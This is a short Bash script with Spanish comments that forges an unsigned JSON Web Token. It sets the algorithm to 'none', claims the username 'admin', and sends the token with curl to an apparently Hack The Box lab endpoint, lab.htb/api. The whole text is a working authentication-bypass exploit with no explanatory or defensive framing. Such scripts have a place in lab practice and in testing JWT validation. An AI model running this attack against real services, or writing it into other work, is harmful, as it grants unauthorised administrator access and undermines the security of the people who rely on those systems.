# 1. Modificar el Header y Payload
HEADER_MODIFICADO='{"alg":"none","typ":"JWT"}'
PAYLOAD_MODIFICADO='{"username":"admin","iat":1746991995}'

# 2. Codificar a Base64 URL-safe sin relleno
HEADER_MODIFICADO_B64=$(echo -n "$HEADER_MODIFICADO" | base64 | tr '+/' '-_' | tr -d '\n' | sed 's/=*$//')
PAYLOAD_MODIFICADO_B64=$(echo -n "$PAYLOAD_MODIFICADO" | base64 | tr '+/' '-_' | tr -d '\n' | sed 's/=*$//')

# 3. Crear el JWT (sin firma)
JWT_MODIFICADO="$HEADER_MODIFICADO_B64.$PAYLOAD_MODIFICADO_B64."
echo "JWT modificado: $JWT_MODIFICADO"

# 4. Enviar el JWT modificado con curl
curl -H "Authorization: Bearer $JWT_MODIFICADO" https://lab.htb/api

